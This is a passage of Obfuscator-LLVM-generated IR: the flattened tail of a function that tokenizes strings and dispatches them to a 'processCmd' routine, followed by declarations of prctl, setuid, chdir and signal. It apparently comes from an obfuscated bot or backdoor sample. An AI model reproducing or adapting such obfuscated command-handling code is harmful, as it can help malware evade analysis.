  %335 = call i8* @strcpy(i8* %333, i8* %334) #5
  %336 = load i32, i32* %20, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %20, align 4
  store i32 -1675951177, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %339, i8** %21, align 8
  store i32 -1504828388, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %20, align 4
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %341, i8** %342)
  %343 = load i32, i32* %20, align 4
  %344 = icmp sgt i32 %343, 1
  %345 = select i1 %344, i32 -2066441383, i32 473863048
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  store i32 -1560166216, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* %22, align 4
  %349 = load i32, i32* %20, align 4
  %350 = icmp slt i32 %348, %349
  %351 = select i1 %350, i32 636822028, i32 1113912671
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %22, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %354
  %356 = load i8*, i8** %355, align 8
  call void @free(i8* %356) #5
  store i32 -571434356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %22, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %22, align 4
  store i32 -1560166216, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 473863048, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 -1588859307, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 -401063338, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  store i32 -415982920, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  ret i32 0

loopEnd:                                          ; preds = %363, %362, %361, %360, %357, %352, %347, %346, %340, %338, %315, %309, %305, %300, %291, %286, %281, %278, %276, %271, %265, %263, %257, %255, %246, %236, %227, %226, %220, %217, %215, %210, %204, %201, %194, %187, %186, %176, %173, %172, %168, %165, %155, %149, %136, %133, %122, %116, %113, %104, %98, %97, %91, %86, %84, %80, %76, %71, %70, %69, %68, %67, %66, %65, %61, %56, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146520450}
!2 = !{i32 -2146519322}
!3 = !{i32 -2146518631}
!4 = !{i32 -2146517882}
!5 = !{i32 -2146516943}
